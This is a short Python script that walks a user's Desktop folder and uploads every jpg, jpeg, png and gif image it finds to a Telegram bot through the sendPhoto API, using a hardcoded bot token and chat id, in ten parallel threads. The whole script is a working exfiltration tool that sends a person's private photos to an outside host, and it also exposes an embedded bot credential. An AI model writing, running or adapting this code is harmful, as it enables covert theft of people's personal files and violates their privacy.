from concurrent.futures import ThreadPoolExecutor
import requests
import os
chat_id = 5676471498
bot_token = "8775815459:AAFwI3-CILQTypwpaERyTWre0EYwS9NYtyE"
with ThreadPoolExecutor(max_workers=10) as executor:
    for root, dirs, files in os.walk(r"C:\Users\ahmed\Desktop"):
        for file in files:
            file_path = os.path.join(root, file)
            file_type = file.split('.')[-1]
            if file_type in ['jpg', 'jpeg', 'png', 'gif']:
                url = f'https://api.telegram.org/bot{bot_token}/sendPhoto'
                data = {'chat_id': chat_id}
                files = {'photo': open(file_path, 'rb')}
                executor.submit(requests.post, url, files=files, data=data)
